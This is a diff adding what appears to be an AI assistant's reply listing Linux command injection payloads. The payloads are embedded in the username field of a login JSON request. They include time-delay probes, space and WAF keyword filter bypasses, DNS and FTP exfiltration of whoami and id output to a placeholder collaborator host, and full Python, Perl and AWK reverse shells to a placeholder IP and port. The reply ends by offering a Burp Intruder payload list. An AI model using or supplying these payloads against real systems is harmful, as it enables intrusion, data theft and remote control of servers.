@@ -1,0 +1,84 @@
+To provide a truly complete testing suite, here are all remaining Linux command injection bypass techniques, formatting variants, and advanced exploitation types that exist.
+## 1. Alternative Command execution & Built-ins
+If common binaries like sleep or ping are deleted, uninstalled, or restricted by permission controls, use Linux shell built-ins or alternative utilities to verify execution.
+
+* Using the read Time-out Built-in: Bypasses external binary restrictions by using an internal shell mechanism to pause the response.
+
+{"password":"9012","username":"652223518; read -t 10;","rememberMe":false}
+
+* Using test Command with a Delay Engine: Triggers time-consuming operations natively.
+
+{"password":"9012","username":"652223518; test -f /dev/random && head -c 50000000 /dev/random > /dev/null;","rememberMe":false}
+
+* Using timeout to Force Halts: Compels commands to stretch out system response times.
+
+{"password":"9012","username":"652223518; timeout 10s cat /dev/zero > /dev/null;","rememberMe":false}
+
+
+## 2. Space-Filtering Bypasses (Advanced)
+If standard space removal methods like $IFS or commas are actively blocked or stripped by input filters, use alternative shell substitution parameters.
+
+* Using Integer Variable Expansion: Uses empty uninitialized bash variables to act as a separation boundary.
+
+{"password":"9012","username":"652223518;sleep$9'10';","rememberMe":false}
+
+* Using Hexadecimal/Octal Escape Character Matching: Uses the printf built-in to feed spaces indirectly to the terminal context.
+
+{"password":"9012","username":"652223518;$(printf 'sleep\x2010');","rememberMe":false}
+
+
+## 3. Advanced WAF Keyword Bypasses
+If regular string concatenation or Base64 is flagged by deep packet inspection or runtime rules, utilize more complex terminal reconstruction tricks.
+
+* Using Wildcard Dynamic Globbing: Calls binaries through system path glob patterns without typing the explicit executable name.
+
+{"password":"9012","username":"652223518; /bin/s?e?p 10;","rememberMe":false}
+
+* Using Uninitialized Variables as Splices: Injects blank shell objects inside protected words to fragment static strings.
+
+{"password":"9012","username":"652223518; sle$@ep 10;","rememberMe":false}
+
+* Using Double Quotes / Single Quotes Mixing: Disrupts pattern matching sequences inside strict monitoring scripts.
+
+{"password":"9012","username":"652223518; s\"l\"e\"e\"p 10;","rememberMe":false}
+
+* Using Reversed Strings: Passes reversed payload text and leverages the rev utility to flip it back right before execution.
+
+{"password":"9012","username":"652223518; echo '01 peels' | rev | sh;","rememberMe":false}
+
+
+## 4. Advanced Out-of-Band (OOB) Channels
+If raw outbound HTTP requests (curl/wget) or classic ICMP traffic (ping) are blocked at the perimeter firewall, data can be exfiltrated via alternative application-layer network channels.
+
+* DNS Exfiltration via nslookup: Forces a DNS resolution request through firewalls that otherwise block direct TCP/UDP outbound routing.
+
+{"password":"9012","username":"652223518; nslookup $(whoami).YOUR_COLLABORATOR_URL;","rememberMe":false}
+
+* DNS Exfiltration via dig: An alternative DNS query method.
+
+{"password":"9012","username":"652223518; dig $(id|id -u).YOUR_COLLABORATOR_URL;","rememberMe":false}
+
+* File Transfer Protocol (FTP) Lookup: Triggers standard outbound requests using network discovery features.
+
+{"password":"9012","username":"652223518; ftp YOUR_COLLABORATOR_URL;","rememberMe":false}
+
+
+## 5. Advanced Alternative Reverse Shells
+If native Bash network structures (/dev/tcp) or standard Netcat setups are denied or completely scrubbed from system binaries, alternative languages installed on Linux can establish the socket.
+
+* Python Interactive Socket:
+
+{"password":"9012","username":"652223518; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);';","rememberMe":false}
+
+* Perl Network Stream:
+
+{"password":"9012","username":"652223518; perl -e 'use Socket;$i=\"YOUR_IP\";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};';","rememberMe":false}
+
+* AWK Socket Session:
+
+{"password":"9012","username":"652223518; awk 'BEGIN {s = \"/inet/tcp/0/YOUR_IP/YOUR_PORT\"; while(1) { printf \"> \" |& s; s |& getline c; if (c == \"exit\") break; while (c |& getline) print $0 |& s; close(c); }}';","rememberMe":false}
+
+
+------------------------------
+If you plan to feed these into Burp Suite, would you like me to output a clear text Intruder payload list formatted specifically for copy-pasting, or would you like to explore blind file-write techniques?
+
